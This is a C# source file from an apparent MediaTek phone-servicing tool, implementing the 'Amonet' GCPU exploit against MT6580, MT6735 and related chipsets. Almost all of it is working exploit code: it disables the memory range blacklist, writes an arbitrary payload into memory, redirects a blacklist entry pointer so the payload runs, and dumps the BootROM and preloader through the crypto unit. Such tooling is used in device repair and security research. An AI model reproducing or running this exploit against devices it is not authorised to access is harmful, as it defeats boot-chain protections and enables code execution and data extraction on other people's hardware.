using System;
using System.Threading.Tasks;
using tools.Modules.MTK.Protocol;
using tools.Modules.MTK.Models;
using tools.Modules.MTK.Hardware;

namespace tools.Modules.MTK.Exploit
{
    /// <summary>
    /// Amonet (GCPU) 漏洞利用
    /// 原理: 利用 GCPU (Graphics Crypto Processing Unit) AES-CBC 解密功能进行任意内存读取
    /// 影响: MT6580, MT6735, MT6737, MT6739, MT6750, MT6752, MT6755, MT6795 等
    /// </summary>
    public class Amonet : ExploitBase
    {
        private readonly GcpuEngine _gcpu;

        public Amonet(PreloaderProtocol preloader, ChipConfig chipConfig)
            : base(preloader, chipConfig)
        {
            if (chipConfig.GcpuBase == 0)
            {
                throw new ArgumentException("Chip does not have GCPU base address configured");
            }

            _gcpu = new GcpuEngine(preloader, chipConfig);
        }

        /// <summary>
        /// 执行漏洞利用 (发送 Payload)
        /// </summary>
        public override bool Exploit(byte[] payload, uint payloadAddr)
        {
            try
            {
                Log($"Starting Amonet (GCPU) exploit, payload addr: 0x{payloadAddr:X}");

                // 先禁用黑名单
                DisableRangeBlacklist();

                // 将 Payload 按 4 字节对齐
                while (payload.Length % 4 != 0)
                {
                    byte[] padded = new byte[payload.Length + 1];
                    Array.Copy(payload, padded, payload.Length);
                    payload = padded;
                }

                // 将 Payload 写入内存
                Log("Writing payload to memory...");
                for (int i = 0; i < payload.Length; i += 4)
                {
                    uint word = BitConverter.ToUInt32(payload, i);
                    Preloader.Write32(payloadAddr + (uint)i, word);
                }

                // 通过修改黑名单入口跳转到 Payload
                if (ChipConfig.Blacklist != null && ChipConfig.Blacklist.Count > 0)
                {
                    uint blEntry = ChipConfig.Blacklist[0];
                    Log($"Setting jump address at blacklist[0]+0x40 (0x{blEntry + 0x40:X})...");
                    Preloader.Write32(blEntry + 0x40, payloadAddr);
                }

                Log("Amonet exploit completed");
                return true;
            }
            catch (Exception ex)
            {
                Log($"Amonet exploit failed: {ex.Message}");
                return false;
            }
        }

        /// <summary>
        /// 通过 GCPU 读取内存
        /// </summary>
        public byte[] DaRead(uint address, uint length)
        {
            Log($"Reading 0x{length:X} bytes from 0x{address:X} via GCPU...");

            byte[] result = new byte[length];
            int offset = 0;

            // GCPU AES-CBC 每次读取 16 字节
            for (uint addr = address; addr < address + length; addr += 16)
            {
                byte[] chunk = _gcpu.AesReadCbc(addr);
                int copyLen = Math.Min(chunk.Length, (int)(address + length - addr));
                Array.Copy(chunk, 0, result, offset, copyLen);
                offset += copyLen;
            }

            return result;
        }

        /// <summary>
        /// 通过 Preloader 写入内存
        /// </summary>
        public void DaWrite(uint address, byte[] data)
        {
            Log($"Writing {data.Length} bytes to 0x{address:X}...");

            for (int i = 0; i < data.Length; i += 4)
            {
                uint word = BitConverter.ToUInt32(data, i);
                Preloader.Write32(address + (uint)i, word);
            }
        }

        /// <summary>
        /// 运行 Payload
        /// </summary>
        public override async Task<bool> RunPayloadAsync(byte[] payload, uint? addr = null)
        {
            uint payloadAddr = addr ?? ChipConfig.DaPayloadAddr;
            byte[] fixedPayload = FixPayload(payload, false);

            Log($"Running payload at 0x{payloadAddr:X}...");

            if (Exploit(fixedPayload, payloadAddr))
            {
                await Task.Delay(200);

                // 等待确认
                try
                {
                    var ack = Preloader.ReadDword();
                    if (ack == 0xA1A2A3A4)
                    {
                        Log("Payload executed successfully");
                        return true;
                    }
                }
                catch { }
            }

            return false;
        }

        /// <summary>
        /// Dump BROM (通过 GCPU)
        /// </summary>
        public override async Task<byte[]?> DumpBromAsync(uint length = 0x20000)
        {
            try
            {
                Log($"Dumping BROM via GCPU, length: 0x{length:X}...");

                DisableRangeBlacklist();

                byte[] brom = new byte[length];
                int lastProgress = 0;

                for (uint addr = 0; addr < length; addr += 16)
                {
                    byte[] chunk = _gcpu.AesReadCbc(addr);
                    Array.Copy(chunk, 0, brom, addr, Math.Min(16, (int)(length - addr)));

                    int progress = (int)(addr * 100 / length);
                    if (progress != lastProgress && progress % 10 == 0)
                    {
                        Log($"Progress: {progress}%, addr: 0x{addr:X}");
                        lastProgress = progress;
                    }
                }

                Log("BROM dump completed");
                return brom;
            }
            catch (Exception ex)
            {
                Log($"BROM dump failed: {ex.Message}");
                return null;
            }
        }

        /// <summary>
        /// Dump Preloader (通过 GCPU)
        /// </summary>
        public override async Task<byte[]?> DumpPreloaderAsync()
        {
            try
            {
                Log("Dumping Preloader via GCPU...");

                // Preloader 通常在 0x200000 - 0x240000
                const uint preloaderStart = 0x200000;
                const uint preloaderEnd = 0x240000;
                uint length = preloaderEnd - preloaderStart;

                DisableRangeBlacklist();

                byte[] preloader = new byte[length];
                int lastProgress = 0;

                for (uint offset = 0; offset < length; offset += 16)
                {
                    uint addr = preloaderStart + offset;
                    byte[] chunk = _gcpu.AesReadCbc(addr);
                    Array.Copy(chunk, 0, preloader, offset, Math.Min(16, (int)(length - offset)));

                    int progress = (int)(offset * 100 / length);
                    if (progress != lastProgress && progress % 10 == 0)
                    {
                        Log($"Progress: {progress}%, addr: 0x{addr:X}");
                        lastProgress = progress;
                    }
                }

                Log("Preloader dump completed");
                return preloader;
            }
            catch (Exception ex)
            {
                Log($"Preloader dump failed: {ex.Message}");
                return null;
            }
        }

        /// <summary>
        /// 禁用内存黑名单
        /// </summary>
        public override bool DisableRangeBlacklist()
        {
            try
            {
                Log("Disabling range blacklist via GCPU...");

                if (ChipConfig.Blacklist == null || ChipConfig.Blacklist.Count == 0)
                {
                    Log("No blacklist configuration");
                    return true;
                }

                // 使用 GCPU 绕过黑名单
                _gcpu.DisableRangeBlacklist(ChipConfig.Blacklist);

                Log("Blacklist disabled");
                return true;
            }
            catch (Exception ex)
            {
                Log($"Failed to disable blacklist: {ex.Message}");
                return false;
            }
        }
    }
}
